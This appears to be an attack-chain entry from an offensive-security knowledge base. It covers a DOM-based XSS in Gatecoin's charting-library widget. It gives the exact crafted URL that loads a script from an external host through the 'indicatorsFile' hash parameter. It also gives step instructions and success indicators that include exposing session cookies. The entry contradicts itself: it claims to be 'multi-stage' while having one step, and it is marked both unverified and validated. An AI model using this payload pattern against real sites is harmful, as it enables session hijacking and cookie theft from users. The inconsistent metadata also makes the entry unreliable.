---
id: ac-dom-xss-gatecoin-indicatorsfile
tags:
  - xss
  - dom-xss
  - javascript-injection
  - client-side-execution
type: attack_chain
tools:
  - '[[tools/Browser]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-DOM-XSS-in-Gatecoin-Charting-Library]]'
step_count: 1
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.859Z'
description: >-
  A single-stage attack exploiting a DOM-based XSS vulnerability in Gatecoin's
  charting library by injecting a malicious external JavaScript file via the
  'indicatorsFile' URL hash parameter, leading to arbitrary code execution in
  the victim's browser.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# DOM-based XSS in Gatecoin Trading Widget via IndicatorsFile Parameter

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Malicious URL] --> B[Script Execution]
    B --> C[Data Exfiltration]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Browser]]

### Target Environment

- Web platform
- Access to Gatecoin's trading widget page
- No specific services or ports required beyond standard HTTPS (443)

### Initial Access Requirements

- No credentials needed
- Direct network access to https://gatecoin.com
- Victim must visit the crafted URL

## Detailed Attack Procedures

### Step 1: Trigger DOM-based XSS
procedure: [[procedures/Exploit-DOM-XSS-in-Gatecoin-Charting-Library]]

**Objective**: Load a malicious external JavaScript file via the 'indicatorsFile' parameter to execute arbitrary code in the browser context of the Gatecoin domain.

**Instructions**: Craft a malicious URL by appending the hash parameter to the vulnerable page. Use a controlled external script host (e.g., blackfan.ru) hosting a proof-of-concept JavaScript file that alerts document.domain and document.cookie. Open the URL in a browser to trigger the load and execution.

The vulnerable URL structure is: https://gatecoin.com/widget-trade/assets/charting_library/static/tv-chart.html#indicatorsFile=//blackfan.ru/tv-chart-poc&disabledFeatures=[]&enabledFeatures=[]

Replace //blackfan.ru/tv-chart-poc with your own hosted malicious script URL if testing ethically.

**Expected Output**: The page loads the charting library, fetches and executes the external script, resulting in an alert popup displaying the domain and cookies.

**Success Indicators**:
- Alert box appears showing 'gatecoin.com' as document.domain
- Alert box reveals session cookies, confirming code execution in the site's context
- Browser console logs any additional script output from the injected JS

## Attack Chain Summary

### Key Achievements

1. Successful injection and execution of arbitrary JavaScript in the Gatecoin domain context
2. Demonstration of client-side data theft potential, such as session cookies
3. Highlighting lack of validation in jQuery's $.getScript usage for external file loading

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
